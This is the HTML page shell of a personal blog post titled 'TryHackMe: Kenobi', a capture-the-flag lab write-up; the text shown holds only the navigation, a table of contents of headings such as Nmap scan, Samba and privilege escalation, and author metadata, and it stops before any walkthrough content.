
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A blog about pentesting, security, and technology.">
      
      
      
        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/07/tryhackme-kenobi.html">
      
      
        <link rel="prev" href="../../05/18/tryhackme-annie.html">
      
      
        <link rel="next" href="tryhackme-include.html">
      
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>TryHackMe: Kenobi - My Personal Site</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
        <script src="https://unpkg.com/iframe-worker/shim"></script>
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="TryHackMe: Kenobi - My Personal Site" >
      
        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
      
        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/tryhackme-kenobi.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/07/tryhackme-kenobi.html" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="TryHackMe: Kenobi - My Personal Site" >
      
        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
      
        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/tryhackme-kenobi.png" >
      
    
    
   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#tryhackme-kenobi" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            My Personal Site
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              TryHackMe: Kenobi
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    tomfieber/tomfieber.github.io
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../index.html" class="md-tabs__link">
        
  
  
    
  
  About Me

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../../index.html" class="md-tabs__link">
          
  
  
    
  
  Blog

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../references/index.html" class="md-tabs__link">
          
  
  
    
  
  References

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    My Personal Site
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    tomfieber/tomfieber.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../index.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    About Me
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../index.html" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Archive
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Archive
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../../archive/2024.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    2024
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Categories
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Categories
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../../category/tryhackme.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    tryhackme
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../../category/vulnlab.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vulnlab
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../../category/writeups.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    writeups
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../../references/index.html" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    References
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            References
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cheatsheets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
        
          
          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Injection attacks
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_1">
            <span class="md-nav__icon md-icon"></span>
            Injection attacks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    NoSQL
    
  </span>
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_1_1">
            <span class="md-nav__icon md-icon"></span>
            NoSQL
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    OS command injection
    
  </span>
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_1_2">
            <span class="md-nav__icon md-icon"></span>
            OS command injection
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    SQL injection
    
  </span>
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_1_3">
            <span class="md-nav__icon md-icon"></span>
            SQL injection
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Methodologies
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Methodologies
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web apps
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3_1">
            <span class="md-nav__icon md-icon"></span>
            Web apps
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OWASP WSTG
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#walkthrough" class="md-nav__link">
    <span class="md-ellipsis">
      Walkthrough
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Walkthrough">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap Scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-footprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Service Footprinting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Service Footprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ftp-port-21" class="md-nav__link">
    <span class="md-ellipsis">
      FTP - Port 21
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs-port-111" class="md-nav__link">
    <span class="md-ellipsis">
      NFS - Port 111
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#samba-port-139" class="md-nav__link">
    <span class="md-ellipsis">
      SAMBA - Port 139
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
  <div class="md-content md-content--post" data-md-component="content">
    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
      <div class="md-sidebar__scrollwrap">
        <div class="md-sidebar__inner md-post">
          <nav class="md-nav md-nav--primary">
            <div class="md-post__back">
              <div class="md-nav__title md-nav__container">
                <a href="../../../index.html" class="md-nav__link">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
                  <span class="md-ellipsis">
                    Back to index
                  </span>
                </a>
              </div>
            </div>
            
              <div class="md-post__authors md-typeset">
                
                  <div class="md-profile md-post__profile">
                    <span class="md-author md-author--long">
                      <img src="https://avatars.githubusercontent.com/u/108031577?v=4" alt="Tom Fieber">
                    </span>
                    <span class="md-profile__description">
                      <strong>
                        
                          <a href="https://tomfieber.github.io">Tom Fieber</a>
                        
                      </strong>
                      <br>
                      Dad, husband, okay pentester
                    </span>
                  </div>
                
              </div>
            
            <ul class="md-post__meta md-nav__list">
              <li class="md-nav__item md-nav__item--section">
                <div class="md-post__title">
                  <span class="md-ellipsis">
                    Metadata
                  </span>
                </div>
                <nav class="md-nav">
                  <ul class="md-nav__list">
                    <li class="md-nav__item">
                      <div class="md-nav__link">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
                        <time datetime="2024-06-07 00:00:00+00:00" class="md-ellipsis">June 7, 2024</time>
                      </div>
                    </li>
                    
                    
                      <li class="md-nav__item">
                        <div class="md-nav__link">
                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
                          <span class="md-ellipsis">
                            in
                            
                              <a href="../../../category/writeups.html">writeups</a>, 
                              <a href="../../../category/tryhackme.html">tryhackme</a></span>
                        </div>
                      </li>
                    
                    
                      
                      <li class="md-nav__item">
                        <div class="md-nav__link">
